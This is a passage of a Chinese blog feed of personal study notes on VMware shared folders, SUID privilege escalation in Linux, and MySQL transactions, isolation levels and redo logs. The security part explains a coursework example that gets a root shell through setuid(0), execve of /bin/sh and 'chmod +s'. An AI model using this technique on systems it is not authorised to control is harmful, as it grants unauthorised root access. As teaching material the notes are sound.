<h3 id="共享文件夹"><a href="#共享文件夹" class="headerlink" title="共享文件夹"></a>共享文件夹</h3><p>共享文件夹中，主机设置为共享的文件夹名字不会显示在客户机中，而是其中的文件和文件夹显示在客户机的&#x2F;mnt&#x2F;hgfs中<br>使用命令vmware-hgfsclient查看文件夹名称share_dir_name<br>使用命令sudo vmhgfs-fuse .host:&#x2F; &#x2F;mnt&#x2F;hgfs -o allow_other挂载<br>编辑文件&#x2F;etc&#x2F;fstab&#x2F;实现永久挂载：<br>.host:&#x2F;share_dir_name &#x2F;mnt&#x2F;hgfs fuse.vmhgfs-fuse allow_other 0 0</p>
<h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>使用clash for windows时只需要打开tun模式即可</p>
<h1 id="问题排查"><a href="#问题排查" class="headerlink" title="问题排查"></a>问题排查</h1><h4 id="SMBus-Host-Controller-not-enabled"><a href="#SMBus-Host-Controller-not-enabled" class="headerlink" title="SMBus Host Controller not enabled!"></a>SMBus Host Controller not enabled!</h4><p><strong>问题描述：</strong>虚拟机克隆后，克隆机启动报错。</p>
<p><strong>产生原因：</strong>原始虚拟机配置了共享文件夹功能，克隆后的虚拟机由于硬件标识（如MAC地址、UUID等）发生变化或没有在VMWare中开启共享文件夹，导致无法正确挂载原始的共享文件夹。系统在启动时尝试挂载共享文件夹失败，从而引发上述错误。</p>
<p><strong>解决方案</strong>：修改<code>/etc/fstab/</code>文件，找到与共享文件夹挂载相关的行，并在其前面添加<code>#</code>以注释掉：</p>
<h1 id="Linux安全"><a href="#Linux安全" class="headerlink" title="Linux安全"></a>Linux安全</h1><h2 id="Suid提权"><a href="#Suid提权" class="headerlink" title="Suid提权"></a>Suid提权</h2><p><code>![](https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240509223134.png)</code><br>编译执行课件suid部分提权到root shell的例子，分析其原理</p>
<p>原理解释：<br>这段代码的提权原理是利用了程序的 Set User ID（SUID）特性。当一个可执行文件具有SUID位时，它在执行时以文件所有者的权限而不是执行者的身份运行。在这个例子中，shell 程序的文件所有者被设置为 root，并且添加了SUID位，因此当非root用户执行该程序时，程序以root用户的权限运行。<br>在代码中<br><code>setuid(0);</code><br>这一行代码调用了 setuid 函数，将有效用户ID设置为0。在Unix&#x2F;Linux系统中，用户ID为0的用户是超级用户（root）。因此，这个程序尝试将自身的权限提升为root。<br><code>execve(name[0], name, 0x0);</code><br>这一行使用 execve 函数执行一个新的程序，即Shell (&#x2F;bin&#x2F;sh)。由于在前一步中已经将有效用户ID设置为0，所以 execve 将以root用户的权限执行Shell。<br><code>sudo chmod +s shell</code><br>此命令将SUID位添加到 shell 文件上，使得在执行该文件时，它将以文件所有者（root）的身份运行。因此，当非root用户执行 shell 程序时，由于SUID特性，该程序将在执行时拥有root权限，提供了一个简单的方式来获得root shell。</p>
]]></content>
      <categories>
        <category>其他语言技术</category>
        <category>其他技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL-Note3-事务日志</title>
    <url>/2024/11/11/MySQL-Note3-%E4%BA%8B%E5%8A%A1%E6%97%A5%E5%BF%97/</url>
    <content><![CDATA[<p>参考资料： <a href="https://mysql.net.cn/doc/refman/8.0/en/">MySQL中文文档</a> <a href="https://www.bilibili.com/video/BV1iq4y1u7vj?p=96">MySQL高级篇-尚硅谷</a></p>
<h1 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h1><h2 id="事务的基础知识"><a href="#事务的基础知识" class="headerlink" title="事务的基础知识"></a>事务的基础知识</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>事务是数据库系统区别于文件系统的重要特性之一。</p>
<p><strong>事务：</strong>一组逻辑操作单元，使数据从一种状态变换到另一种状态。</p>
<p><strong>事务处理的原则：</strong>保证所有事务都作为<code>一个工作单元</code>来执行，即使出现了故障，都不能改变这种执行方<br>式。当在一个事务中执行多个操作时，要么所有的事务都被<code>提交( commit )</code>，那么这些修改就<code>永久</code>地保<br>存下来；要么数据库管理系统将<code>放弃</code>所作的所有<code>修改</code> ，整个事务<code>回滚( rollback )</code>到最初状态。</p>
<p>查看数据库引擎和支持事务的情况：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW ENGINES -- 命令来查看当前 MySQL 支持的存储引擎都有哪些，以及这些存储引擎是否支持事务。</span><br></pre></td></tr></table></figure>



<p><strong>事务不是一个像函数那样明确定义的结构，在MySQL中，事务管理需要显式地控制一系列数据库操作的执行，也就是说具体的数据库操作如select等在每一次开启事务时都需要自己输入，并根据这些操作的成功与否来决定是提交（commit）还是回滚（rollback）事务。</strong></p>
<h3 id="事务的-ACID-四大特性"><a href="#事务的-ACID-四大特性" class="headerlink" title="事务的 ACID 四大特性"></a>事务的 ACID 四大特性</h3><ol>
<li><p><code>原子性 atomicity</code>：指事务是一个不可分割的工作单位，要么全部提交，要么全部失败回滚。</p>
</li>
<li><p><code>一致性 consistency</code>：指事务执行前后，数据从一个<code>合法性状态</code>变换到另外一个<code>合法性状态</code> 。这种状态<br> 是<code>语义上</code>的而不是语法上的，跟具体的业务有关。</p>
<blockquote>
<p>什么是合法的数据状态呢？满足 <strong>预定的约束</strong> 的状态就叫做合法的状态。通俗一点，这状态是由你自己<br>来定义的（比如满足现实世界中的约束）。满足这个状态，数据就是一致的，不满足这个状态，数据就<br>是不一致的！如果事务中的某个操作失败了，系统就会自动撤销当前正在执行的事务，返回到事务操作<br>之前的状态。例如，假设A储蓄账户拥有200元，转账300元出去，则其余额是-100元，这就是不一致的，因为储蓄账户余额为负数不是一个合法的状态。</p>
</blockquote>
</li>
<li><p><code>隔离性 isolation</code>：指一个事务的执行<code>不能被其他事务干扰</code> ，即一个事务内部的操作及使用的数据对<code>并发</code>的<br> 其他事务是隔离的，并发执行的各个事务之间不能互相干扰。</p>
</li>
<li><p><code>持久性 duration</code>：指一个事务一旦被提交，它对数据库中数据的改变就是<code>永久性</code>的 ，接下来的其他操作和数据库故障不应该对其有任何影响。</p>
<blockquote>
<p>持久性是通过 <strong>事务日志</strong> 来保证的。日志包括了 <strong>重做日志</strong> 和 <strong>回滚日志</strong> 。当我们通过事务对数据进行修改<br>的时候，首先会将数据库的变化信息记录到重做日志中，然后再对数据库中对应的行进行修改。这样做<br>的好处是，即使数据库系统崩溃，数据库重启后也能找到没有更新到数据库系统中的重做日志，重新执<br>行，从而使事务具有持久性。</p>
</blockquote>
</li>
</ol>
<h3 id="事务的状态"><a href="#事务的状态" class="headerlink" title="事务的状态"></a>事务的状态</h3><p>MySQL根据这些操作所执行的不同阶段将事务大致划分为几个状态：</p>
<ul>
<li><code>活动的 active</code>：事务对应的数据库操作正在执行过程中</li>
<li><code>部分提交的 partially committed</code>：当事务中的最后一个操作执行完成，但由于操作都在内存中执行，所造成的影响并 <code>没有刷新到磁盘</code></li>
<li><code>失败的 failed</code>：当事务处在 <code>活动的</code> 或者 <code>部分提交的</code> 状态时，可能遇到了某些错误（数据库自身的错误、操作系统错误或者直接断电等）而无法继续执行，或者人为的停止当前事务的执行</li>
<li><code>中止的 aborted</code>：如果事务执行了一部分而变为 <code>失败的</code> 状态，那么就需要把已经修改的事务中的操作还原到事务执行前的状态。换句话说，就是要撤销失败事务对当前数据库造成的影响。我们把这个撤销的过程称之为 回滚 。当 <code>回滚</code> 操作执行完毕时，也就是数据库恢复到了执行事务之前的状态，我们就说该事务处在了 中止的 状态。</li>
<li><code>提交的 committed</code>：当一个处在 <code>部分提交的</code> 状态的事务将修改过的数据都 <code>同步到磁盘 </code>上之后，我们就可以说该事务处在了 提交的 状态。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241126233918.png"></p>
<p>事务的完成过程：</p>
<ol>
<li>开启事务</li>
<li>执行一系列DML操作</li>
<li>事务结束的状态：提交&#x2F;中止</li>
</ol>
<h3 id="显式-隐式事务和保存点"><a href="#显式-隐式事务和保存点" class="headerlink" title="显式&#x2F;隐式事务和保存点"></a>显式&#x2F;隐式事务和保存点</h3><h4 id="显式事务"><a href="#显式事务" class="headerlink" title="显式事务"></a>显式事务</h4><p>第一步：<strong>事务的显式开启</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start transacting  </span><br><span class="line">-- 后可以跟参数：</span><br><span class="line">-- read only 当前事务是一个只读事务 ，也就是属于该事务的数据库操作只能读取数据，而不能修改数据。</span><br><span class="line">-- read write(默认) 标识当前事务是一个 读写事务 ，也就是属于该事务的数据库操作既可以读取数据，也可以修改数据</span><br><span class="line">-- with consistent snapshot 启动一致性读。</span><br><span class="line"></span><br><span class="line">-- 或</span><br><span class="line">begin</span><br></pre></td></tr></table></figure>

<p>第二步：一系列事务操作</p>
<p>第三步：<strong>提交 或 中止事务</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 提交事务，提交后对数据库的修改是永久性的</span><br><span class="line">COMMIT</span><br><span class="line">-- 中止(回滚)事务</span><br><span class="line">ROLLBACK</span><br><span class="line">-- 将事务回滚到某个保存点，注意，回滚后事务没有进入最终状态，必须commit后rollback</span><br><span class="line">ROLLBACK TO [SAVEPOINT]</span><br></pre></td></tr></table></figure>

<p><strong>设置保存点</strong>：在事务中设置保存点可以方便后续针对保存点进行回滚而不是回滚整个事务，一个事务可以包含多个保存点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 设置保存点</span><br><span class="line">SAVEPOINT 保存点名称</span><br><span class="line">-- 删除保存点</span><br><span class="line">RELEASE SAVEPOINT 保存点名称</span><br></pre></td></tr></table></figure>



<h3 id="隐式事务"><a href="#隐式事务" class="headerlink" title="隐式事务"></a>隐式事务</h3><p>隐式事务（Implicit Transactions）在MySQL中指的是一种不需要显式地启动和提交或回滚的事务处理方式。</p>
<ul>
<li><strong>自动提交</strong>：隐式事务下，每个单独的SQL语句都被视为一个独立的事务，并在执行后自动提交。这意味着每个DML语句（如INSERT、UPDATE、DELETE）执行后，MySQL会自动将其结果提交到数据库中，而不需要用户显式地调用COMMIT语句。</li>
<li><strong>无明确标记</strong>：与显式事务不同，隐式事务没有明显的开启和结束标记。它们是在不使用BEGIN、COMMIT和ROLLBACK语句的情况下自动进行的。</li>
<li><strong>自动回滚</strong>：如果隐式事务中的SQL语句执行失败，MySQL会自动回滚该事务，以确保数据的一致性和完整性。</li>
</ul>
<p><strong>隐式控制方式</strong></p>
<ul>
<li><p><code>autocommit变量：</code></p>
<ul>
<li>隐式事务的行为（<strong>主要是DML操作</strong>）受autocommit系统变量的控制</li>
<li>默认情况下，autocommit的值为1（启用状态），表示每个单独的SQL语句都会自动提交。</li>
<li>如果将其设置为0（禁用状态），则需要显式地提交或回滚事务，也就是需要自己输入<code>COMMIT</code>或<code>ROLLBACK</code></li>
</ul>
</li>
<li><p><strong>查看和修改</strong>：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 查看autocommit的当前值</span><br><span class="line">SHOW VARIABLES LIKE &#x27;autocommit&#x27;;</span><br><span class="line">-- 启用或禁用隐式事务提交。</span><br><span class="line">SET autocommit = 1/0;</span><br><span class="line">-- 或</span><br><span class="line">SET autocommit = TRUE/FALSE;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>不受autocommit控制而必定隐式提交数据的情况</strong></p>
<ol>
<li><code>数据定义语言（DDL）</code>：当我们使用<code>create</code>, <code>alter</code>, <code>drop</code>等语句修改数据库对象（包括<code>数据库</code>，<code>表</code>，<code>视图</code>，<code>存储过程</code>）时，会<strong>隐式提交前边所有语句所属的事务</strong>.</li>
<li>上一个事务还未提交或回滚时又显式开启新的事务时，会隐式提交上一个事务</li>
<li><code>autocommit</code>在<code>OFF</code>情况下，我们使用set语句调整为<code>ON</code>开启时，会隐式提交前边的语句所属的事务</li>
<li>使用<code>LOCK TABLES</code>, <code>UNLOCK TABLES</code>关于<strong>锁定的语句</strong>也会隐式提交前边的语句所属的事务</li>
<li><strong>加载数据的语句</strong>，如<code>LOAD DATA</code>批量导入数据时，也会隐式提交前边的语句所属的事务</li>
<li><strong>MySQL复制的一些语句</strong>，如<code>START SLAVE</code>, <code>STOP SLAVE</code>, <code>RESET SLAVE</code>, <code>CHANGE MASTER TO</code>等语句时，也会隐式提交前边的语句所属的事务</li>
<li>其他语句：分析、检查、优化表语句；</li>
</ol>
<h3 id="事务的隔离级别"><a href="#事务的隔离级别" class="headerlink" title="事务的隔离级别"></a>事务的隔离级别</h3><p>MySQL是一个 <code>客户端／服务器</code> 架构的软件，对于同一个服务器来说，可以有若干个客户端与之连接，每<br>个客户端与服务器连接上之后，就可以称为一个会话（ <code>Session</code> ）。每个客户端都可以在自己的会话中<br>向服务器发出请求语句，一个请求语句可能是某个事务的一部分，也就是对于服务器来说可能同时处理<br>多个事务。事务有 <code>隔离性</code> 的特性，理论上在某个事务 <code>对某个数据进行访问</code> 时，其他事务应该进行 排<br>队 ，当该事务提交之后，其他事务才可以继续访问这个数据。但是这样对 <code>性能影响太大</code> ，我们既想保持<br>事务的隔离性，又想让服务器在处理访问同一数据的多个事务时 <code>性能尽量高些</code> ，那就看二者如何权衡取<br>舍了。</p>
<h4 id="脏写、脏读、不可重复读和幻读"><a href="#脏写、脏读、不可重复读和幻读" class="headerlink" title="脏写、脏读、不可重复读和幻读"></a>脏写、脏读、不可重复读和幻读</h4><p>数据并发可能产生的以下问题，按严重程度排序：</p>
<ol>
<li><strong>脏写</strong>：一个事务覆盖了另一个事务未提交的更改。</li>
<li><strong>脏读</strong>：一个事务读取了另一个事务未提交的更改。</li>
<li><strong>不可重复读</strong>：在同一事务中，两次读取同一数据得到的结果不同，因为其他事务已修改该数据。</li>
<li><strong>幻读</strong>：在同一事务中，两次执行相同查询得到的结果集不同，因为其他事务已插入满足查询条件的新数据。</li>
</ol>
<p>具体如下：</p>
<ol>
<li><code>脏写（Dirty Write）</code>：指一个事务修改了另一个事务尚未提交的数据。<ul>
<li><strong>场景</strong>：事务A正在修改某条记录但尚未提交，事务B也在此时修改同一条记录，并成功提交。如果事务A最终回滚，那么事务B所做的修改就基于了“脏”数据（即A未提交的数据），导致数据不一致。</li>
<li><strong>解决</strong>：通过加锁机制（如行级锁或表级锁）来防止脏写，确保事务在修改数据前必须获得相应的锁。</li>
</ul>
</li>
<li><code>脏读（Dirty Read）</code>：指一个事务读取了另一个事务尚未提交的数据。<ul>
<li><strong>场景</strong>：事务A正在修改某条记录但尚未提交，事务B读取了这条尚未提交的记录。如果事务A最终回滚，事务B读取的数据就是无效的“脏”数据。</li>
<li><strong>解决</strong>：通过设置数据库的事务隔离级别来避免脏读。例如，在SQL标准中，将隔离级别设置为“读已提交”（Read Committed）或以上，可以确保事务只能读取到已提交的数据。</li>
</ul>
</li>
<li><code>不可重复读（Non-repeatable Read）</code>：指在一个事务内，两次读取同一条记录得到的结果不同，通常是因为另一个事务在该期间修改了这条记录。<ul>
<li><strong>场景</strong>：事务A读取某条记录，然后事务B修改了这条记录并提交。接着，事务A再次读取同一条记录时，得到的结果与第一次读取不同。</li>
<li><strong>解决</strong>：通过设置数据库的事务隔离级别来避免不可重复读。例如，将隔离级别设置为“可重复读”（Repeatable Read）或以上，可以确保在一个事务内多次读取同一条记录时得到的结果一致。</li>
</ul>
</li>
<li><code>幻读（Phantom Read）</code>：指在一个事务内，两次查询相同条件的结果集不同，通常是因为另一个事务在该期间<code>插入</code>（删除不算）了满足查询条件的新记录。<ul>
<li><strong>场景</strong>：事务A执行了一个查询操作，然后事务B插入了一条新记录（该记录满足事务A的查询条件）。接着，事务A再次执行相同的查询操作时，得到了一个包含新记录的结果集。</li>
<li><strong>解决</strong>：幻读通常通过更高的事务隔离级别（如“可串行化”（Serializable））来解决，这种级别会加锁所有满足查询条件的记录，以及可能插入这些记录的范围（即“间隙锁”或“范围锁”），以防止其他事务插入新记录。</li>
</ul>
</li>
</ol>
<h4 id="四种隔离级别"><a href="#四种隔离级别" class="headerlink" title="四种隔离级别"></a>四种隔离级别</h4><p>隔离级别越低，并发问题发生的就越多。SQL标准中设立了4个隔离级别，<code>均能避免脏写</code>问题：</p>
<ul>
<li><code>READ UNCOMMITTED </code>：读未提交，在该隔离级别，所有事务都可以看到其他未提交事务的执行结果。不能避免脏读、不可重复读、幻读。<br>  <code>READ COMMITTED</code>：读已提交，它满足了隔离的简单定义：一个事务<strong>只能看见已经提交事务所做的改变</strong>。这是大多数数据库系统的<strong>默认隔离级别（但不是MySQL默认的）</strong>。可以避免脏读，但不可重复读、幻读问题仍然存在。<br>  <code>REPEATABLE READ</code> ：可重复读，事务A在读到一条数据之后，此时事务B对该数据进行了修改并提交，那么事务A再读该数据，读到的还是原来的内容。可以避免脏读、不可重复读，但幻读问题仍然存在（<code>若采用MVCC时，也解决了幻读</code>）。这是<strong>MySQL的默认</strong>隔离级别。<br>  <code>SERIALIZABLE</code>：<strong>可串行化</strong>，确保事务可以从一个表中读取相同的行。在这个事务持续期间，禁止其他事务对该表执行插入、更新和删除操作。所有的并发问题都可以避免，但<strong>性能十分低下</strong>。能避免脏读、不可重复读和幻读。</li>
</ul>
<table>
<thead>
<tr>
<th>隔离级别</th>
<th>脏读可能性</th>
<th>不可重复读可能性</th>
<th>幻读可能性</th>
<th>加锁读</th>
</tr>
</thead>
<tbody><tr>
<td>READ UNCOMITED</td>
<td><code>YES</code></td>
<td>YES</td>
<td>YES</td>
<td>NO</td>
</tr>
<tr>
<td>READ COMMITTED</td>
<td>NO</td>
<td><code>YES</code></td>
<td>YES</td>
<td>NO</td>
</tr>
<tr>
<td>REPEATABLE READ</td>
<td>NO</td>
<td>NO</td>
<td><code>YES</code></td>
<td>NO</td>
</tr>
<tr>
<td>SERIALIZABLE</td>
<td>NO</td>
<td>NO</td>
<td>NO</td>
<td><code>YES</code></td>
</tr>
</tbody></table>
<h4 id="MySQL对不同隔离级别的支持"><a href="#MySQL对不同隔离级别的支持" class="headerlink" title="MySQL对不同隔离级别的支持"></a>MySQL对不同隔离级别的支持</h4><p><strong>查看隔离级别：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;transaction_isolation&#x27;;</span><br><span class="line">select @@transaction_isolation;</span><br></pre></td></tr></table></figure>

<p><strong>设置隔离级别</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set [global|session] transaction_isolation = &#x27;隔离级别&#x27;；</span><br><span class="line">-- 其中隔离级别可以是</span><br><span class="line">-- read-uncommitted</span><br><span class="line">-- read-committed</span><br><span class="line">-- repeatable-read</span><br><span class="line">-- serializable</span><br><span class="line"></span><br><span class="line">-- 或</span><br><span class="line">set [global|session] transaction isolation level 隔离级别；</span><br><span class="line">-- 其中隔离级别可以是</span><br><span class="line">-- read uncommitted</span><br><span class="line">-- read committed</span><br><span class="line">-- repeatable read</span><br><span class="line">-- serializable</span><br></pre></td></tr></table></figure>



<p><code>global</code> 和 <code>session</code>参数的影响：</p>
<ul>
<li><code>global</code>：当前已经存在的会话无效，仅对执行完后的重新登陆产生的新会话有作用，重启服务器失效。</li>
<li><code>session</code>：对<strong>当前会话</strong>的所有后续的事务<strong>有效</strong>，如果在事务之间执行，则对后续的事务有效，<strong>该语句可以在已经开启的事务中间执行，但不会影响当前正在执行的事务</strong></li>
</ul>
<h3 id="事务分类和completion参数（了解）"><a href="#事务分类和completion参数（了解）" class="headerlink" title="事务分类和completion参数（了解）"></a>事务分类和completion参数（了解）</h3><p>设置参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @@completion_type = 1;</span><br></pre></td></tr></table></figure>

<p>参数的作用：</p>
<ol>
<li><code>completion=0</code>： 默认情况，当我们执行commit时会提交事务，开启下一个事务仍然需要使用<code>start transaction</code>或<code>begin</code>开启</li>
<li><code>completion=1</code>：提交事务后相当于执行了<code>commit and chain</code>，也就是开启了一个链式事务，即当我们提交事务后会开启一个相同隔离级别的事务。</li>
<li><code>completion=2</code>：这种情况下，<code>commit = commit and release</code>，也就是说<strong>提交后自动和服务器断开连接</strong></li>
</ol>
<h4 id="事务的分类"><a href="#事务的分类" class="headerlink" title="事务的分类"></a>事务的分类</h4><ol>
<li><p><code>扁平事务（Flat Transactions）</code>：最简单、最基础的事务类型，表示一个简单的事务单元。通常由一系列的数据库操作组成，这些操作要么全部执行成功，要么全部执行失败，具有原子性。</p>
<ul>
<li><strong>特点</strong>：事务从开始到结束都在同一级别上执行，没有额外的控制结构。事务执行过程中，如果遇到任何错误，整个事务都会回滚到事务开始之前的状态。</li>
</ul>
</li>
<li><p><code>链事务（Chained Transactions）：</code>链事务允许一个事务的提交触发另一个事务的开始。这种类型的事务通常用于需要按顺序执行的一系列操作，其中每个操作都依赖于前一个操作的结果。<strong>特点</strong>：</p>
<ul>
<li><p>提交事务操作和开始下一个事务操作合并为一个原子操作。这意味着下一个事务将看到上一个事务的结果，就好像在一个事务中进行的一样。</p>
</li>
<li><p>链事务可以看作是保存点模式的一种变种，但与带有保存点的扁平事务不同的是，链事务的回滚仅限于当前事务，即只能恢复到最近一个的保存点（虽然链事务本身不显式设置保存点，但每个事务的提交点可以视为一个隐式的保存点）。</p>
</li>
</ul>
</li>
<li><p><code>带有保存点的扁平事务（Flat Transactions with Savepoints）</code>：在扁平事务的基础上引入了保存点的概念。保存点是事务中的一个标记，允许在事务执行过程中部分提交或回滚。<strong>特点</strong>：</p>
<ul>
<li><p>可以通过设置保存点来实现更灵活的事务控制。如果在事务执行过程中遇到错误，可以选择回滚到某个保存点，而不是回滚整个事务。</p>
</li>
<li><p>带有保存点的扁平事务在事务开始时隐式设置了一个保存点（即事务的开始点），此外还可以根据需要显式设置其他保存点。</p>
</li>
</ul>
</li>
<li><p><code>嵌套事务（Nested Transactions）</code>：嵌套事务是指一个事务内部包含其他事务，形成一个层次结构框架。由一个顶层事务控制各个子事务。<strong>特点</strong>：</p>
<ul>
<li><p>子事务的提交或回滚通常不会立即影响外部事务或同级子事务，而是等到外部事务提交或回滚时才统一处理。这意味着子事务的提交是局部的、临时的，只有外部事务提交后，所有子事务的提交才会被永久化。</p>
</li>
<li><p>嵌套事务在某些数据库系统中可能不受支持，但可以通过其他机制（如带有保存点的事务）来模拟嵌套事务的行为。</p>
</li>
</ul>
</li>
<li><p>分布式事务（Distributed Transactions）分布式事务是指一个事务跨越多个不同的数据库或服务节点，这些节点可能分布在不同的物理机器或多个不同的系统中。<strong>特点</strong>：</p>
<ul>
<li><p>由于事务涉及到多个独立的资源管理器（如数据库、消息队列、缓存系统等），因此保证数据的一致性和完整性变得非常复杂。</p>
</li>
<li><p>分布式事务需要采用特定的策略来管理和协调，以确保事务的原子性、一致性、隔离性和持久性（ACID特性）。常用的分布式事务解决方案包括TCC（Try-Confirm-Cancel）、Saga模式以及消息队列事务等。</p>
</li>
</ul>
</li>
</ol>
<h2 id="MySQL事务日志-一致性和原子性"><a href="#MySQL事务日志-一致性和原子性" class="headerlink" title="MySQL事务日志 一致性和原子性"></a>MySQL事务日志 一致性和原子性</h2><p>事务的<strong>隔离性</strong>由<code>锁机制</code>实现，而事务的<strong>原子性、一致性和持久性</strong>由事务的<code>redo 日志</code>和<code>undo 日志</code>来保证。</p>
<ul>
<li><code>REDO LOG</code> 称为 <code>重做日志</code> ，提供再写入操作，恢复提交事务修改的页操作，用来保证事务的持久性。</li>
<li><code>UNDO LOG</code> 称为 <code>回滚日志</code> ，回滚行记录到某个特定版本，用来保证事务的原子性、一致性</li>
</ul>
<p>UNDO <strong>不是</strong> REDO 的逆过程，它们都可以视为一种恢复操作，但是：</p>
<ul>
<li>redo log：是存储引擎层（InnoDB）生成的日志，记录的是<code>物理级别</code>上的页修改操作，如页号xxx偏移量yyy写入数据zzz，主要保证数据可靠性。</li>
<li>undo log：是存储引擎层（InnoDB）生成的日志，记录的是<code>逻辑操作</code>日志，记录了每个修改操作的<strong>逆操作</strong>，如对每一行数据执行插入操作后，日志就会记录一条与之相反的delete操作。主要用于<code>事务的回滚</code>和<code>一致性非锁定读</code></li>
</ul>
<h3 id="REDO-日志-一致性的保证"><a href="#REDO-日志-一致性的保证" class="headerlink" title="REDO 日志  一致性的保证"></a>REDO 日志  一致性的保证</h3><p>InnoDB存储引擎采用缓冲池来优化CPU和磁盘数据读取速度。在真正访问页面之前，需要先把磁盘上的页缓存到内存中的缓冲池中，所有数据的变更都需要<code>先刷新缓存池</code>中的数据，如何缓冲池中的<code>脏页</code>会以一定的频率被刷入磁盘(<code>checkPoint</code>机制)。然而由于checkpoint 并不是每次变更的时候就触发的，而是master线程隔一段时间去处理的。所以最坏的情况就是事务提交后，<strong>刚写完缓冲池，数据库宕机了</strong>，那么这段<strong>数据就是丢失的</strong>，无法恢复。但同时，事务包含<code>持久性</code>的特性，就是说对于一个已经<strong>提交的事务</strong>，在事务提交后<strong>即使系统发生了崩溃</strong>，这个事务对数据库中所做的<strong>更改也不能丢失</strong>。那么如何保证这个持久性呢？ 一个简单的做法 ：在事务提交完成之前把该事务所修改的所有页面都刷新到磁盘，但是这个简单粗暴的做法有些问题，如修改量和刷新磁盘的工作量严重不成比例，且随机I&#x2F;O（更改随机的页）刷新效率太低。另一个解决的思路 ：我们只是想让已经提交了的事务对数据库中数据所做的修改永久生效，即使后来系统崩溃，在重启后也能把这种修改恢复出来。所以我们其实没有必要在每次事务提交时就把该事务在内存中修改过的全部页面刷新到磁盘，只需要把 <code>修改了哪些东西记录一下</code> 就好。比如，某个事务将系统表空间中 第10号 页面中偏移量为 100 处的那个字节的值 1 改成 2 。我们只需要记录一下：将第0号表空间的10号页面的偏移量为100处的值更新为 2 。</p>
<p><strong>优点</strong></p>
<ul>
<li>redo日志降低了刷盘频率</li>
<li>redo日志占用的空间非常小</li>
</ul>
<p><strong>特点</strong></p>
<ul>
<li><p>redo日志是按产生的顺序写入磁盘的</p>
<blockquote>
<p>一条语句可能产生多条日志</p>
</blockquote>
</li>
<li><p>事务执行过程中，redo log不断记录</p>
</li>
</ul>
<h4 id="REDO日志的组成"><a href="#REDO日志的组成" class="headerlink" title="REDO日志的组成"></a><strong>REDO日志的组成</strong></h4><p>可以简单分为以下两部分</p>
<ul>
<li><p>重做日志的缓冲（redo log buffer），保存在内存中，易失；</p>
<blockquote>
<p>服务器启动时会向操作系统申请一片默认为16M（通过修改参数innodb_log_buffer_size修改)的redo log buffer的连续内存空间，将其划分为多个连续的redo log block，每个默认占用512字节。</p>
</blockquote>
</li>
<li><p>重做日志文件（redo log file），保存在硬盘中，持久的</p>
</li>
</ul>
<h4 id="REDO的整体流程"><a href="#REDO的整体流程" class="headerlink" title="REDO的整体流程"></a>REDO的整体流程</h4><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241129112733.png"></p>
<p>第1步：先将原始数据从磁盘中读入内存中来，修改数据的内存拷贝<br>第2步：生成一条重做日志并写入redo log buffer，记录的是数据被修改后的值<br>第3步：当事务commit时，将redo log buffer中的内容刷新到 redo log file，对 redo log file采用追加写的方式<br>第4步：定期将内存中修改的数据刷新到磁盘中</p>
<h4 id="REDO的刷盘策略"><a href="#REDO的刷盘策略" class="headerlink" title="REDO的刷盘策略"></a>REDO的刷盘策略</h4><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241129113845.png"></p>
<p><strong>注：</strong>redo log buffer刷盘到redo log file的过程并不是真正的刷到磁盘中去，只是刷入到 文件系统缓存（page cache）中去（这是现代操作系统为了提高文件写入效率做的一个优化），真正的写入会交给系统自己来决定（比如page cache足够大了）。</p>
<p>针对这种情况，InnoDB给出 <code>innodb_flush_log_at_trx_commit</code> 参数，该参数控制 commit提交事务时，如何将 redo log buffer 中的日志刷新到 redo log file 中。它支持三种策略：<br><code>设置为0</code>：表示每次事务提交时不进行刷盘操作。（系统默认master thread每隔1s进行一次重做日志的同步），风险最高</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241129115954.png"></p>
<p><code>设置为1</code>：表示每次事务提交时都将进行同步，刷盘操作（<code>默认值</code>）。安全性最好，效率较差</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241129114317.png"></p>
<p><code>设置为2</code>：表示每次事务提交时都只把 redo log buffer 内容写入 page cache，不进行同步。由os自己决定什么时候同步到磁盘文件。数据库系统宕机不影响数据写入，但操作系统宕机会影响。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241129114450.png"></p>
<h4 id="REDO-LOG-BUFFER的写入过程"><a href="#REDO-LOG-BUFFER的写入过程" class="headerlink" title="REDO LOG BUFFER的写入过程"></a>REDO LOG BUFFER的写入过程</h4><p>一个事务可以包含若干条语句，每一条语句其实是由若干个 mtr 组成，每一个 mtr 又可以包含若干条redo日志。</p>
<p>写入buffer时使用变量buffer_free记录写入哪个buffer block的偏移量。</p>
<p>一个buffer log block由日志头，日志体和日志尾构成，分别占用12，492，8字节，共计512字节，恰为机械磁盘一个扇区的大小，可以避免磁盘转动。</p>
<h4 id="REDO-LOG-FILE的相关参数"><a href="#REDO-LOG-FILE的相关参数" class="headerlink" title="REDO LOG FILE的相关参数"></a>REDO LOG FILE的相关参数</h4><ul>
<li>innodb_log_group_home_dir ：指定 redo log 文件组所在的路径，默认值为 .&#x2F; ，表示在数据库的数据目录下。MySQL的默认数据目录（ var&#x2F;lib&#x2F;mysql ）下默认有两个名为 ib_logfile0 和</li>
<li>ib_logfile1 的文件，log buffer中的日志默认情况下就是刷新到这两个磁盘文件中。此redo日志文件位置还可以修改。</li>
